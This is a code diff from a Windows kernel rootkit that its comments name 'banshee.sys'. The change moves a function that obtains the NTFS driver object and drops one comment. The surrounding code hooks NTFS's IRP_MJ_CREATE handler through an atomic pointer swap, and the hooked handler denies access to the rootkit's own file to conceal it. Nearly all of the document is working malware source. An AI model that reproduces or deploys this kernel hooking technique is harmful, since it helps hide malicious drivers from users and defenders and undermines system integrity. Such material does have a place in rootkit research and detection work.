@@ -44,6 +44,32 @@ BeGetFilenameFromPath(PWCH fullPath)
     }
 }
 
+
+/**
+ * Retrieves the driver object of the NTFS driver.
+ *
+ * @param ntfsDriverObject Pointer to a variable to receive the pointer to the NTFS driver object.
+ * @return STATUS_SUCCESS if successful, otherwise returns an appropriate NTSTATUS error code.
+ */
+NTSTATUS
+BeGetNtfsDriverObject(OUT PDRIVER_OBJECT* ntfsDriverObject)
+{
+    NTSTATUS status;
+    UNICODE_STRING ntfsDriverName = RTL_CONSTANT_STRING(L"\\FileSystem\\NTFS");
+    OBJECT_ATTRIBUTES objectAttributes;
+
+    InitializeObjectAttributes(&objectAttributes, &ntfsDriverName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    // Get a pointer to the driver object representing the NTFS driver
+    status = BeGlobals::pObReferenceObjectByName(&ntfsDriverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)ntfsDriverObject);
+    if (status != 0)
+    {
+        return status;
+    }
+
+    return STATUS_SUCCESS;
+}
+
 /**
  * Hooked IRP_MJ_CREATE handler for the NTFS driver.
  * Denies access to the file if the filename matches the rootkit driver filename "banshee.sys",
@@ -76,31 +102,6 @@ BeHooked_NTFS_IRP_MJ_CREATE(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 }
 
 /**
- * Retrieves the driver object of the NTFS driver.
- *
- * @param ntfsDriverObject Pointer to a variable to receive the pointer to the NTFS driver object.
- * @return STATUS_SUCCESS if successful, otherwise returns an appropriate NTSTATUS error code.
- */
-NTSTATUS 
-BeGetNtfsDriverObject(OUT PDRIVER_OBJECT* ntfsDriverObject)
-{
-    NTSTATUS status;
-    UNICODE_STRING ntfsDriverName = RTL_CONSTANT_STRING(L"\\FileSystem\\NTFS");
-    OBJECT_ATTRIBUTES objectAttributes;
-
-    InitializeObjectAttributes(&objectAttributes, &ntfsDriverName, OBJ_CASE_INSENSITIVE, NULL, NULL);
-
-    // Get a pointer to the driver object representing the NTFS driver
-    status = BeGlobals::pObReferenceObjectByName(&ntfsDriverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)ntfsDriverObject);
-    if (status != 0)
-    {
-        return status;
-    }
-
-    return STATUS_SUCCESS;
-}
-
-/**
  * Hooks the IRP_MJ_CREATE function of the NTFS driver.
  *
  * @return STATUS_SUCCESS if successful, otherwise returns an appropriate NTSTATUS error code.
@@ -119,7 +120,6 @@ BeHookNTFSFileCreate()
 
     // Get the MJ_CREATE function of the ntfs driver and save it to the global variable
     // Also put our function as the IRP_MJ_CREATE handler instead
-    // No lock needed, since we use the atomic InterlockedExchange function
     BeGlobals::originalNTFS_IRP_MJ_CREATE_function = (NTFS_IRP_MJ_CREATE_FUNCTION)InterlockedExchange64((LONG64*)&ntfsDriverObject->MajorFunction[IRP_MJ_CREATE], (LONG64)BeHooked_NTFS_IRP_MJ_CREATE);
 
 	ObDereferenceObject(ntfsDriverObject);
